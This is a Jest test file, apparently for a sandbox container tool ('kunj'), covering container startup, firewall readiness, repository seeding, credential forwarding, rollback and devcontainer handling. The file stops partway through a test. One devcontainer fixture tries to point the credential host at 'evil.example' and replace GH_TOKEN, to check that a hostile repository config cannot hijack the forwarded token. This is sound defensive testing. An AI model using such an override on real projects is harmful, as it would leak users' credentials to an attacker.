import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { execFileSync } from 'child_process';
import { FakeBackend } from './fake-backend';
import { ContainerInfo, ContainerSpec, ExecIO, ImageInfo } from '../backend';
import { containerNames, labelsFor, LABEL } from '../names';
import { SANDBOX_IMAGE, NETHELPER_IMAGE } from '../image';
import { DIND_DOMAINS, DIND_IMAGE } from '../dind';
import { SEED_MARKER } from '../seed';
import { describeGuard } from '../env';
import { ResolvedBlueprint, blueprintHash, parseBlueprint, snapshotTag } from '../blueprint';
import { Preset } from '../presets';
import { planSnapshot } from '../snapshot';
import { KunjConfig } from '../../../types';

let keepDir = '';
let keptFiles: string[] = [];

jest.mock('../seed', () => {
  const actual = jest.requireActual('../seed') as object;
  return {
    ...actual,
    inspectOrigin: jest.fn(),
    refExistsOnOrigin: jest.fn(),
    pushBranch: jest.fn(),
    hostGitIdentity: jest.fn(),
  };
});

// The host blueprint and presets are looked up under these, never the developer's ~/.kunj
jest.mock('../../config', () => ({
  getKunjDir: () => path.join(tmp, 'kunj'),
  getGlobalKunjDir: () => path.join(tmp, 'global'),
}));

jest.mock('../../keep', () => ({
  getKeepDir: () => keepDir,
  listKeptFiles: () => keptFiles,
}));

import * as seed from '../seed';
import {
  startContainer,
  stopContainer,
  removeContainer,
  inspectForRemove,
  containerStatus,
  forwardedEnv,
  firewallEnv,
  StartError,
  StartOptions,
  BUILD_NETWORK_WARNING,
  STALE_SNAPSHOT_HINT,
  noSnapshotHint,
  findSnapshot,
  baseImageTag,
} from '../lifecycle';

// Fixture repositories and subprocesses: slow when the machine is busy
jest.setTimeout(30000);

const mocked = seed as jest.Mocked<typeof seed>;

const VERSION = '9.9.9';
const REPO = { root: '/repo', name: 'app', id: 'github.com/acme/app', originUrl: 'https://github.com/acme/app.git' };
const BRANCH = 'feature/x';
const names = containerNames(REPO.name, REPO.id, BRANCH);
const READY = 'test -f /tmp/kunj-ready';
const MARKER = `test -f ${SEED_MARKER}`;

let tmp: string;
const GIT_ENV = { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@e', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@e' };

function options(over: Partial<StartOptions> = {}): StartOptions {
  return {
    branch: BRANCH,
    create: false,
    publish: [],
    rebuild: false,
    config: { container: {} } as KunjConfig,
    repo: REPO,
    kunjVersion: VERSION,
    hostEnv: { GH_TOKEN: 'tok', ANTHROPIC_API_KEY: 'k' },
    cwd: tmp,
    jsonMode: false,
    skipHooks: false,
    keepOnError: false,
    confirmPush: async () => true,
    warn: () => {},
    ...over,
  };
}

function backend(): FakeBackend {
  const b = new FakeBackend();
  b.existingImages.add(SANDBOX_IMAGE(VERSION));
  b.existingImages.add(NETHELPER_IMAGE(VERSION));
  // No seed marker yet, and no postCreate marker
  b.execResults.set(MARKER, { exitCode: 1, stdout: '' });
  return b;
}

function runSpecs(b: FakeBackend): ContainerSpec[] {
  return b.callsOf('run').map(a => a[0] as ContainerSpec);
}

function execCmds(b: FakeBackend): string[] {
  return b.callsOf('exec').map(a => (a[1] as string[]).join(' '));
}

function info(over: Partial<ContainerInfo>): ContainerInfo {
  return {
    id: 'main-id',
    name: names.container,
    state: 'running',
    image: SANDBOX_IMAGE(VERSION),
    createdAt: '',
    labels: labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'main' }),
    ports: [],
    ...over,
  };
}

beforeEach(() => {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'kunj-lifecycle-'));
  keepDir = path.join(tmp, 'keep');
  keptFiles = [];
  mocked.inspectOrigin.mockResolvedValue({
    originUrl: REPO.originUrl,
    originHost: 'github.com',
    credentialHost: 'github.com',
    branchOnOrigin: true,
    unpushed: 0,
    isSsh: false,
  });
  mocked.refExistsOnOrigin.mockResolvedValue(true);
  mocked.pushBranch.mockResolvedValue();
  mocked.hostGitIdentity.mockResolvedValue({ name: 'Ada', email: 'ada@example.com' });
});

afterEach(() => {
  fs.rmSync(tmp, { recursive: true, force: true });
  jest.clearAllMocks();
});

describe('startContainer', () => {
  it('creates network, volumes, helper and container in order', async () => {
    const b = backend();
    const result = await startContainer(b, options());

    expect(b.methods().slice(0, 12)).toEqual([
      'info',
      'inspectLabels',
      'imageExists',
      'imageExists',
      'createNetwork',
      'volumeExists',
      'createVolume',
      'volumeExists',
      'createVolume',
      'run',
      'run',
      'exec',
    ]);
    const [main, helper] = runSpecs(b);
    expect(main.name).toBe(names.container);
    // Only what chown and sudo need; NET_RAW in particular is gone
    expect(main.capDrop).toEqual(['ALL']);
    expect(main.capabilities).toEqual(['CHOWN', 'DAC_OVERRIDE', 'FOWNER', 'SETUID', 'SETGID']);
    expect(main.securityOpt).toBeUndefined();
    expect(main.extraHosts).toEqual(['host.docker.internal:host-gateway']);
    expect(main.init).toBe(true);
    // The image's own ENTRYPOINT never runs
    expect(main.entrypoint).toEqual(['sleep']);
    expect(main.command).toEqual(['infinity']);
    expect(main.user).toBe('dev');
    expect(main.workdir).toBe('/workspace');
    expect(main.volumes).toEqual([
      { name: names.workspaceVolume, path: '/workspace' },
      { name: names.homeVolume, path: '/home/dev' },
    ]);
    expect(main.env).toEqual({ GH_TOKEN: 'tok', ANTHROPIC_API_KEY: 'k', KUNJ_CREDENTIAL_HOST: 'github.com', KUNJ_CONTAINER: '1', KUNJ_BRANCH: BRANCH, KUNJ_REPO: REPO.name });
    expect(main.labels[LABEL.role]).toBe('main');
    expect(JSON.parse(main.labels[LABEL.options])).toEqual({ firewall: 'default', allowHost: false, publish: [], helperEnv: helper.env, user: 'dev', imageKind: 'sandbox' });

    expect(helper.name).toBe(names.helper);
    expect(helper.image).toBe(NETHELPER_IMAGE(VERSION));
    expect(helper.networkOf).toBe('id-1');
    expect(helper.capabilities).toEqual(['NET_ADMIN', 'NET_RAW']);
    // docker refuses --add-host with --network container:<id>
    expect(helper.extraHosts).toBeUndefined();
    expect(helper.init).toBe(false);
    expect(helper.labels[LABEL.role]).toBe('helper');
    expect(helper.env.KUNJ_FW_ORIGIN_HOST).toBe('github.com');
    // origin's port, so the allowlist check can reach an origin that is not on 443 or 22
    expect(helper.env.KUNJ_FW_ORIGIN_PORT).toBe('443');

    // The seed runs only after the helper reported ready
    const cmds = execCmds(b);
    const seedAt = cmds.findIndex(c => c.startsWith('sh -c set -e'));
    expect(seedAt).toBeGreaterThan(cmds.indexOf(READY));
    expect(result).toMatchObject({ containerId: 'id-1', created: true, seeded: true, firewall: 'default' });
  });

  it('runs nothing in the container before the helper reports ready', async () => {
    const b = backend();
    // Ready on the third poll
    b.existingImages.add('custom:1');
    let polls = 0;
    const real = b.exec.bind(b);
    b.exec = async (id: string, cmd: string[], io?: ExecIO) => {
      const r = await real(id, cmd, io);
      if (cmd.join(' ') === READY) return { exitCode: ++polls >= 3 ? 0 : 1, stdout: '' };
      return r;
    };
    await startContainer(b, options({ imageOverride: 'custom:1' }));
    const execs = b.callsOf('exec').map(a => ({ id: a[0], cmd: (a[1] as string[]).join(' ') }));
    const readyAt = execs.findIndex((e, i) => e.cmd === READY && execs.slice(0, i + 1).filter(x => x.cmd === READY).length === 3);
    expect(readyAt).toBeGreaterThan(-1);
    expect(execs.slice(0, readyAt).every(e => e.id === 'id-2' && e.cmd === READY)).toBe(true);
    // id -u / tool checks for a non-sandbox image come after ready too
    expect(execs.slice(readyAt + 1).some(e => e.id === 'id-1')).toBe(true);
  });

  it("resolves the image's own user with id -un after ready, and passes no -u for it", async () => {
    const b = backend();
    b.existingImages.add('custom:1');
    b.execResults.set('id -un', { exitCode: 0, stdout: 'node\n' });
    const result = await startContainer(b, options({ imageOverride: 'custom:1' }));
    expect(result.user).toBe('node');
    expect(runSpecs(b)[0].user).toBeUndefined();
    expect(JSON.parse(runSpecs(b)[0].labels[LABEL.options]).user).toBe('');
    const execs = b.callsOf('exec');
    const whoami = execs.findIndex(a => (a[1] as string[]).join(' ') === 'id -un');
    expect(whoami).toBeGreaterThan(execs.findIndex(a => (a[1] as string[]).join(' ') === READY));
    expect((execs[whoami][2] as ExecIO | undefined)?.user).toBeUndefined();
    // Nothing in the main container gets -u for an image's own user
    expect(execs.filter(a => a[0] === 'id-1').every(a => !(a[2] as ExecIO | undefined)?.user)).toBe(true);

    // The sandbox's user is known: no lookup
    const sandbox = backend();
    expect((await startContainer(sandbox, options())).user).toBe('dev');
    expect(execCmds(sandbox)).not.toContain('id -un');
  });

  it('gives the credential helper host:port and the firewall the bare host and port', async () => {
    mocked.inspectOrigin.mockResolvedValue({
      originUrl: 'https://git.example.com:8443/acme/app.git',
      originHost: 'git.example.com',
      credentialHost: 'git.example.com:8443',
      branchOnOrigin: true,
      unpushed: 0,
      isSsh: false,
    });
    const b = backend();
    await startContainer(b, options());
    const [main, helper] = runSpecs(b);
    expect(main.env.KUNJ_CREDENTIAL_HOST).toBe('git.example.com:8443');
    expect(helper.env).toMatchObject({ KUNJ_FW_ORIGIN_HOST: 'git.example.com', KUNJ_FW_ORIGIN_PORT: '8443' });
  });

  it('streams the credential helper into any image before seeding and points git at it', async () => {
    const b = backend();
    b.existingImages.add('custom:1');
    b.execResults.set('sh -c printf %s "$HOME"', { exitCode: 0, stdout: '/home/node' });
    await startContainer(b, options({ imageOverride: 'custom:1' }));
    const execs = b.callsOf('exec');
    const tarAt = execs.findIndex(a => (a[1] as string[]).includes('/home/node/.kunj/bin'));
    const seedAt = execs.findIndex(a => (a[1] as string[])[2]?.startsWith('set -e'));
    expect(tarAt).toBeGreaterThan(-1);
    expect(tarAt).toBeLessThan(seedAt);
    expect((execs[tarAt][1] as string[])[2]).toContain('tar -xf -');
    const tar = b.stdinData[tarAt]!;
    expect(tar).toContain('git-credential-kunj');
    expect(tar).toContain('KUNJ_CREDENTIAL_HOST');
    // mode 0755 in the ustar header
    expect(tar.slice(100, 107)).toBe('0000755');
    expect((execs[seedAt][1] as string[])[2]).toContain("credential.helper '/home/node/.kunj/bin/git-credential-kunj'");

    // No token: no helper
    const none = backend();
    await startContainer(none, options({ hostEnv: { ANTHROPIC_API_KEY: 'k' } }));
    expect(none.callsOf('exec').some(a => (a[1] as string[]).some(x => x.includes('.kunj/bin')))).toBe(false);
  });

  it('streams the bundle before the seed and removes it after', async () => {
    const hostPath = path.join(tmp, 'origin.bundle');
    const bytes = Buffer.from(Array.from({ length: 3000 }, (_, i) => (i * 7) % 256));
    fs.writeFileSync(hostPath, bytes);
    const b = backend();
    await startContainer(b, options({ bundle: { hostPath, containerPath: '/tmp/kunj-origin.bundle' } }));
    const execs = b.callsOf('exec');
    const argv = (i: number) => execs[i][1] as string[];
    const tarAt = execs.findIndex(a => (a[1] as string[])[2]?.includes('tar -xf -') && (a[1] as string[]).includes('/tmp'));
    const seedAt = execs.findIndex(a => (a[1] as string[])[2]?.startsWith('set -e'));
    const rmAt = execs.findIndex(a => (a[1] as string[]).join(' ') === 'rm -f /tmp/kunj-origin.bundle');
    expect(tarAt).toBeGreaterThan(-1);
    expect(tarAt).toBeLessThan(seedAt);
    expect(seedAt).toBeLessThan(rmAt);
    // As the sandbox user, like the clone
    const user = (execs[seedAt][2] as { user?: string }).user;
    expect(user).toBeTruthy();
    expect(execs[tarAt][2]).toMatchObject({ user });
    expect(execs[rmAt][2]).toMatchObject({ user });
    const tar = Buffer.from(b.stdinData[tarAt]!, 'latin1');
    expect(tar.subarray(0, 100).toString().replace(/\0+$/, '')).toBe('kunj-origin.bundle');
    expect(tar.subarray(100, 107).toString()).toBe('0000600');
    expect(tar.subarray(512, 512 + bytes.length).equals(bytes)).toBe(true);
    const script = argv(seedAt)[2];
    expect(script).toContain("git clone --no-checkout -b 'feature/x' '/tmp/kunj-origin.bundle' /workspace");
    // The token in hostEnv is not configured for a bundle seed
    expect(script).not.toContain('credential.helper');
    expect(execs.some(a => (a[1] as string[]).some(x => x.includes('.kunj/bin')))).toBe(false);
  });

  it('a failed bundle seed names private submodules, not a token', async () => {
    const hostPath = path.join(tmp, 'origin.bundle');
    fs.writeFileSync(hostPath, 'bundle');
    const b = backend();
    const real = b.exec.bind(b);
    b.exec = async (id, cmd, io) => ((cmd[2] ?? '').startsWith('set -e') ? { exitCode: 1, stdout: '' } : real(id, cmd, io));
    const err = await startContainer(b, options({ bundle: { hostPath, containerPath: '/tmp/kunj-origin.bundle' } })).catch(e => e);
    expect(err).toMatchObject({ code: 'seed' });
    expect(err.message).toContain("Cloning the host's bundle of");
    expect(err.message).toContain('private submodules');
    expect(err.message).not.toContain('forward a token');
  });

  it('bundle skips the no-token and unpushed gates', async () => {
    mocked.inspectOrigin.mockResolvedValue({
      originUrl: 'git@github.com:acme/app.git',
      originHost: 'github.com',
      credentialHost: 'github.com',
      branchOnOrigin: false,
      unpushed: 3,
      isSsh: true,
    });
    const hostPath = path.join(tmp, 'origin.bundle');
    fs.writeFileSync(hostPath, 'bundle');
    const confirmPush = jest.fn(async () => false);
    const b = backend();
    await startContainer(b, options({ hostEnv: {}, jsonMode: true, confirmPush, bundle: { hostPath, containerPath: '/tmp/kunj-origin.bundle' } }));
    expect(confirmPush).not.toHaveBeenCalled();
    expect(mocked.pushBranch).not.toHaveBeenCalled();
    expect(b.methods()).toContain('run');
  });

  it('refuses a name whose labels do not match', async () => {
    const b = backend();
    b.existing = [info({ labels: labelsFor(REPO.id, 'feature-x', { [LABEL.role]: 'main' }) })];
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'collision' });
    expect(b.methods()).not.toContain('run');
  });

  it('fails with unpushed when the user declines the push', async () => {
    const b = backend();
    mocked.inspectOrigin.mockResolvedValue({
      originUrl: REPO.originUrl,
      originHost: 'github.com',
      credentialHost: 'github.com',
      branchOnOrigin: true,
      unpushed: 2,
      isSsh: false,
    });
    const err = await startContainer(b, options({ confirmPush: async () => false })).catch(e => e);
    expect(err).toBeInstanceOf(StartError);
    expect(err.code).toBe('unpushed');
    expect(mocked.pushBranch).not.toHaveBeenCalled();
    expect(b.methods().filter(m => m.startsWith('create') || m === 'run')).toEqual([]);
  });

  it('pushes when the user accepts, and never prompts in json mode', async () => {
    mocked.inspectOrigin.mockResolvedValue({
      originUrl: REPO.originUrl,
      originHost: 'github.com',
      credentialHost: 'github.com',
      branchOnOrigin: false,
      unpushed: 1,
      isSsh: false,
    });
    await startContainer(backend(), options());
    expect(mocked.pushBranch).toHaveBeenCalledWith(BRANCH, tmp);

    const confirmPush = jest.fn(async () => true);
    await expect(startContainer(backend(), options({ jsonMode: true, confirmPush }))).rejects.toMatchObject({ code: 'unpushed' });
    expect(confirmPush).not.toHaveBeenCalled();
  });

  it('refuses a base that is not on origin, an ssh origin without a token and a hostless origin', async () => {
    mocked.refExistsOnOrigin.mockResolvedValue(false);
    await expect(startContainer(backend(), options({ create: true, base: 'nope' }))).rejects.toMatchObject({ code: 'base-missing' });

    mocked.inspectOrigin.mockResolvedValue({
      originUrl: 'git@github.com:acme/app.git',
      originHost: 'github.com',
      credentialHost: 'github.com',
      branchOnOrigin: true,
      unpushed: 0,
      isSsh: true,
    });
    await expect(startContainer(backend(), options({ hostEnv: {} }))).rejects.toMatchObject({ code: 'no-token' });

    mocked.inspectOrigin.mockResolvedValue({ originUrl: '/srv/app.git', originHost: '', credentialHost: '', branchOnOrigin: true, unpushed: 0, isSsh: false });
    await expect(startContainer(backend(), options())).rejects.toMatchObject({ code: 'origin' });
  });

  it('rolls back everything created when seed fails', async () => {
    const failSeed = (b: FakeBackend) => {
      const real = b.exec.bind(b);
      b.exec = async (id: string, cmd: string[], io?: ExecIO) => {
        const r = await real(id, cmd, io);
        return cmd[0] === 'sh' && cmd[1] === '-c' && cmd[2].startsWith('set -e') ? { exitCode: 1, stdout: '' } : r;
      };
    };

    const b = backend();
    failSeed(b);
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'seed' });
    expect(b.callsOf('remove')).toEqual([[{
      containers: [names.helper, names.container],
      volumes: [names.workspaceVolume, names.homeVolume],
      networks: [names.network],
    }]]);

    const kept = backend();
    failSeed(kept);
    await expect(startContainer(kept, options({ keepOnError: true }))).rejects.toMatchObject({ code: 'seed' });
    expect(kept.methods()).not.toContain('remove');
  });

  it('fails with firewall when the helper exits, before anything is checked inside', async () => {
    const b = backend();
    b.execErrors.set(READY, new Error('docker exec failed: container is not running'));
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'firewall' });
    // This run created the volumes, so they go too
    expect(b.callsOf('remove')).toEqual([[{
      containers: [names.helper, names.container],
      volumes: [names.workspaceVolume, names.homeVolume],
      networks: [names.network],
    }]]);
    expect(execCmds(b)).not.toContain(MARKER);
  });

  it('--keep-on-error keeps the objects but stops a container whose firewall never came up', async () => {
    const b = backend();
    b.execErrors.set(READY, new Error('docker exec failed: container is not running'));
    await expect(startContainer(b, options({ keepOnError: true }))).rejects.toMatchObject({ code: 'firewall' });
    expect(b.methods()).not.toContain('remove');
    expect(b.callsOf('stop')).toEqual([[names.container]]);

    // Once the firewall is up, a later failure leaves it running for debugging
    const seedFails = backend();
    const real = seedFails.exec.bind(seedFails);
    seedFails.exec = async (id: string, cmd: string[], io?: ExecIO) =>
      cmd[2]?.startsWith('set -e') ? { exitCode: 1, stdout: '' } : real(id, cmd, io);
    await expect(startContainer(seedFails, options({ keepOnError: true }))).rejects.toMatchObject({ code: 'seed' });
    expect(seedFails.methods()).not.toContain('stop');

    // Resume: the container it started is stopped, the helper kept
    const resumed = backend();
    resumed.existing = [info({ state: 'exited' })];
    resumed.execErrors.set(READY, new Error('docker exec failed: not running'));
    await expect(startContainer(resumed, options({ keepOnError: true }))).rejects.toMatchObject({ code: 'firewall' });
    expect(resumed.callsOf('stop')).toEqual([['main-id']]);
    expect(resumed.callsOf('remove')).toEqual([[{ containers: [names.helper] }]]);
  });

  it('removes nothing when the network cannot be created', async () => {
    const b = backend();
    b.failOn = 'createNetwork';
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'docker' });
    expect(b.callsOf('remove')).toEqual([[{ containers: [], volumes: [], networks: [] }]]);
  });

  it('rolls back the first volume when the second cannot be created', async () => {
    const b = backend();
    const real = b.createVolume.bind(b);
    b.createVolume = async (name, labels) => {
      if (name === names.homeVolume) throw new Error('docker volume create failed: disk full');
      return real(name, labels);
    };
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'docker' });
    expect(b.callsOf('remove')).toEqual([[{ containers: [], volumes: [names.workspaceVolume], networks: [names.network] }]]);
  });

  it('removes the main container when docker run fails', async () => {
    const b = backend();
    b.failOn = 'run';
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'docker' });
    expect(b.callsOf('remove')).toEqual([[{
      containers: [names.container],
      volumes: [names.workspaceVolume, names.homeVolume],
      networks: [names.network],
    }]]);
  });

  it('never removes a volume that existed before a failed fresh start', async () => {
    const b = backend();
    b.volumes.add(names.workspaceVolume);
    b.execErrors.set(READY, new Error('docker exec failed: container is not running'));
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'firewall' });
    expect(b.callsOf('createVolume').map(a => a[0])).toEqual([names.homeVolume]);
    expect(b.callsOf('remove')).toEqual([[{
      containers: [names.helper, names.container],
      volumes: [names.homeVolume],
      networks: [names.network],
    }]]);
  });

  it('skips seed when the marker exists and reruns it when missing', async () => {
    const seeded = backend();
    seeded.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    const r1 = await startContainer(seeded, options());
    expect(r1.seeded).toBe(false);
    expect(execCmds(seeded).some(c => c.startsWith('sh -c set -e'))).toBe(false);

    const fresh = backend();
    const r2 = await startContainer(fresh, options());
    expect(r2.seeded).toBe(true);
    const seedCall = fresh.callsOf('exec').find(a => (a[1] as string[])[2]?.startsWith('set -e'))!;
    expect((seedCall[2] as ExecIO).user).toBe('dev');
    expect((seedCall[1] as string[])[2]).toContain("git switch 'feature/x'");
  });

  it('resumes a stopped container: starts it and recreates the helper', async () => {
    const b = backend();
    b.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    b.existing = [
      info({ state: 'exited' }),
      info({ id: 'helper-id', name: names.helper, state: 'exited', labels: labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'helper' }) }),
    ];
    const result = await startContainer(b, options());
    expect(result.created).toBe(false);
    expect(b.callsOf('start')).toEqual([['main-id']]);
    expect(b.callsOf('remove')).toEqual([[{ containers: [names.helper] }]]);
    expect(runSpecs(b).map(s => s.name)).toEqual([names.helper]);
    expect(runSpecs(b)[0].networkOf).toBe('main-id');
    expect(b.methods()).not.toContain('createNetwork');
  });

  it('rebuild builds the image and recreates the container on the same volumes', async () => {
    const b = backend();
    b.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    b.existing = [info({})];
    const result = await startContainer(b, options({ rebuild: true }));
    expect(result.created).toBe(true);
    const m = b.methods();
    expect(m.indexOf('buildImage')).toBeLessThan(m.indexOf('remove'));
    expect(b.callsOf('remove')).toEqual([[{ containers: [names.helper, names.container] }]]);
    expect(runSpecs(b).map(s => s.name)).toEqual([names.container, names.helper]);
  });

  it('resumes even when the branch is gone from origin or has unpushed commits, without prompting', async () => {
    const b = backend();
    b.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    b.existing = [info({ state: 'exited' })];
    mocked.inspectOrigin.mockResolvedValue({ originUrl: REPO.originUrl, originHost: 'github.com', credentialHost: 'github.com', branchOnOrigin: false, unpushed: 3, isSsh: false });
    const confirmPush = jest.fn(async () => false);
    const result = await startContainer(b, options({ confirmPush, jsonMode: true }));
    expect(result.created).toBe(false);
    expect(confirmPush).not.toHaveBeenCalled();
    expect(mocked.pushBranch).not.toHaveBeenCalled();
    expect(runSpecs(b)[0].env.KUNJ_FW_ORIGIN_HOST).toBe('github.com');
  });

  it('resume runs postStartCommand as the recorded user', async () => {
    const b = backend();
    b.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    const recorded = { user: 'node', postStartCommand: 'npm run dev' };
    b.existing = [info({ state: 'exited', labels: labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'main', [LABEL.options]: JSON.stringify(recorded) }) })];
    await startContainer(b, options());
    const post = b.callsOf('exec').find(a => (a[1] as string[]).join(' ') === 'sh -lc npm run dev');
    expect((post?.[2] as ExecIO).user).toBe('node');
  });

  describe('MCP bridge config', () => {
    const READ_CLAUDE = 'sh -c f="$HOME/.claude.json"; [ -e "$f" ] || exit 3; cat "$f"';
    const mcpConfig = { container: { mcp: { chrome: {} } } } as unknown as KunjConfig;

    it('adds the container.mcp servers to ~/.claude.json after the seed, as the user', async () => {
      const b = backend();
      b.execResults.set(READ_CLAUDE, { exitCode: 3, stdout: '' });
      await startContainer(b, options({ config: mcpConfig }));
      const cmds = execCmds(b);
      const seedAt = cmds.findIndex(c => c.startsWith('sh -c set -e'));
      const readAt = cmds.indexOf(READ_CLAUDE);
      expect(readAt).toBeGreaterThan(seedAt);
      const write = b.callsOf('exec')[readAt + 1];
      expect((write[2] as ExecIO).user).toBe('dev');
      expect(JSON.parse(b.stdinData[readAt + 1]!).mcpServers.chrome).toEqual({ command: 'socat', args: ['-', 'UNIX-CONNECT:/run/kunj-mcp/chrome.sock'] });
    });

    it('touches no ~/.claude.json without container.mcp', async () => {
      const b = backend();
      await startContainer(b, options());
      expect(execCmds(b)).not.toContain(READ_CLAUDE);
    });

    it('also on a resume, and a failure is only a warning', async () => {
      const b = backend();
      b.execResults.set(MARKER, { exitCode: 0, stdout: '' });
      b.execResults.set(READ_CLAUDE, { exitCode: 1, stdout: '' });
      b.existing = [info({ state: 'exited' })];
      const warnings: string[] = [];
      const result = await startContainer(b, options({ config: mcpConfig, warn: m => warnings.push(m) }));
      expect(result.created).toBe(false);
      expect(execCmds(b)).toContain(READ_CLAUDE);
      expect(warnings.join('\n')).toMatch(/Claude Code config/);
    });
  });

  it('reports a collision before any push prompt', async () => {
    const b = backend();
    b.existing = [info({ labels: { other: 'x' } })];
    mocked.inspectOrigin.mockResolvedValue({ originUrl: REPO.originUrl, originHost: 'github.com', credentialHost: 'github.com', branchOnOrigin: false, unpushed: 1, isSsh: false });
    const confirmPush = jest.fn(async () => true);
    await expect(startContainer(b, options({ confirmPush }))).rejects.toMatchObject({ code: 'collision' });
    expect(confirmPush).not.toHaveBeenCalled();
  });

  it('resume stops a container it started when the helper fails', async () => {
    const b = backend();
    b.existing = [info({ state: 'exited' })];
    b.execErrors.set(READY, new Error('docker exec failed: not running'));
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'firewall' });
    expect(b.callsOf('stop')).toEqual([['main-id']]);
    expect(execCmds(b).filter(c => c !== READY)).toEqual([]);
  });

  it('is a no-op for a running container with a running helper', async () => {
    const b = backend();
    b.existing = [
      info({}),
      info({ id: 'helper-id', name: names.helper, labels: labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'helper' }) }),
    ];
    const result = await startContainer(b, options());
    expect(result).toMatchObject({ created: false, seeded: false, containerId: 'main-id' });
    expect(b.methods().filter(m => ['run', 'start', 'remove', 'exec'].includes(m))).toEqual([]);
  });

  it('streams keep files and container.files in and lists them', async () => {
    fs.mkdirSync(path.join(keepDir, 'config'), { recursive: true });
    fs.writeFileSync(path.join(keepDir, 'config', '.env'), 'SECRET=1\n');
    keptFiles = ['config/.env'];
    fs.writeFileSync(path.join(tmp, 'aws-config'), '[default]\n');
    const b = backend();
    const result = await startContainer(b, options({
      config: { container: { files: [`${tmp}/aws-config:~/.aws/config`, `${tmp}/missing:/etc/x`] } } as KunjConfig,
      warn: () => {},
    }));
    expect(result.keptFiles).toEqual(['config/.env']);
    expect(result.copiedFiles).toEqual(['/home/dev/.aws/config']);
    const tarCalls = b.callsOf('exec').filter(a => (a[1] as string[]).some(x => x.includes('tar -xf')));
    expect(tarCalls.map(a => (a[1] as string[]).slice(-1)[0])).toEqual(['/home/dev/.kunj/bin', '/workspace', '/home/dev/.aws']);
    expect(b.stdinData.filter(Boolean).join('')).toContain('SECRET=1');
  });

  it('publishes requested ports on free host ports', async () => {
    const b = backend();
    const result = await startContainer(b, options({ publish: [3000], config: { container: { publish: ['3000', '8080'] } } as KunjConfig }));
    expect(result.publish.map(p => p.container)).toEqual([3000, 8080]);
    expect(new Set(result.publish.map(p => p.host)).size).toBe(2);
    expect(runSpecs(b)[0].publish).toEqual(result.publish);
  });

  it('ignoreForwardPorts publishes none of the devcontainer forwardPorts', async () => {
    const git = (...args: string[]) => execFileSync('git', args, { cwd: tmp, env: GIT_ENV });
    git('init', '-q');
    fs.mkdirSync(path.join(tmp, '.devcontainer'));
    fs.writeFileSync(path.join(tmp, '.devcontainer', 'devcontainer.json'), JSON.stringify({ forwardPorts: [5173] }));
    git('add', '.');
    git('commit', '-qm', 'dc');
    git('update-ref', `refs/remotes/origin/${BRANCH}`, 'HEAD');

    const b = backend();
    const result = await startContainer(b, options({ ignoreForwardPorts: true }));
    expect(result.publish).toEqual([]);
    expect(runSpecs(b)[0].publish).toEqual([]);
  });

  it('uses the devcontainer on origin: user, env, ports and post commands', async () => {
    const git = (...args: string[]) => execFileSync('git', args, { cwd: tmp, env: GIT_ENV });
    git('init', '-q');
    fs.mkdirSync(path.join(tmp, '.devcontainer'));
    fs.writeFileSync(path.join(tmp, '.devcontainer', 'devcontainer.json'), JSON.stringify({
      image: 'node:22',
      remoteUser: 'node',
      containerEnv: { FOO: 'bar', KUNJ_CREDENTIAL_HOST: 'evil.example', GH_TOKEN: 'stolen', KUNJ_BRANCH: 'evil', KUNJ_REPO: 'evil', KUNJ_CONTAINER: '0' },
      forwardPorts: [5173],
      postCreateCommand: 'npm ci',
      postStartCommand: 'npm run dev',
    }));
    git('add', '.');
    git('commit', '-qm', 'dc');
    git('update-ref', `refs/remotes/origin/${BRANCH}`, 'HEAD');

    const b = backend();
    b.existingImages.add('node:22');
    b.execResults.set('id -u', { exitCode: 0, stdout: '1000\n' });
    b.execResults.set('sh -c test -f "$HOME/.kunj-created"', { exitCode: 1, stdout: '' });
    b.execResults.set('sh -lc npm ci', { exitCode: 1, stdout: '' });
    const warnings: string[] = [];
    const result = await startContainer(b, options({ warn: m => warnings.push(m) }));

    const main = runSpecs(b)[0];
    expect(result.image).toBe('node:22');
    expect(main.user).toBe('node');
    expect(main.volumes[1]).toEqual({ name: names.homeVolume, path: '/home/node' });
    expect(main.env).toMatchObject({ FOO: 'bar', KUNJ_CREDENTIAL_HOST: 'github.com', GH_TOKEN: 'tok', KUNJ_BRANCH: BRANCH, KUNJ_REPO: REPO.name, KUNJ_CONTAINER: '1' });
    expect(result.publish.map(p => p.container)).toEqual([5173]);
    const cmds = execCmds(b);
    expect(cmds).toContain('sh -lc npm ci');
    expect(cmds).toContain('sh -lc npm run dev');
    // postCreateCommand failed: no marker, so it runs again next time
    expect(cmds).not.toContain('sh -c touch "$HOME/.kunj-created"');
    expect(warnings.some(w => w.includes('postCreateCommand failed'))).toBe(true);
  });

  it('warns before building a devcontainer Dockerfile changed on this branch', async () => {
    const git = (...args: string[]) => execFileSync('git', args, { cwd: tmp, env: GIT_ENV });
    git('init', '-q');
    fs.mkdirSync(path.join(tmp, '.devcontainer'));
    fs.writeFileSync(path.join(tmp, '.devcontainer', 'devcontainer.json'), JSON.stringify({ build: { dockerfile: 'Dockerfile' }, remoteUser: 'node' }));
    fs.writeFileSync(path.join(tmp, '.devcontainer', 'Dockerfile'), 'FROM node:22\n');
    git('add', '.');
    git('commit', '-qm', 'dc');
    git('update-ref', 'refs/remotes/origin/main', 'HEAD');
    git('update-ref', `refs/remotes/origin/${BRANCH}`, 'HEAD');

    const run = async (defaultBranch?: string) => {
      const b = backend();
      b.execResults.set('id -u', { exitCode: 0, stdout: '1000\n' });
      const warnings: string[] = [];
      const build = b.buildImage.bind(b);
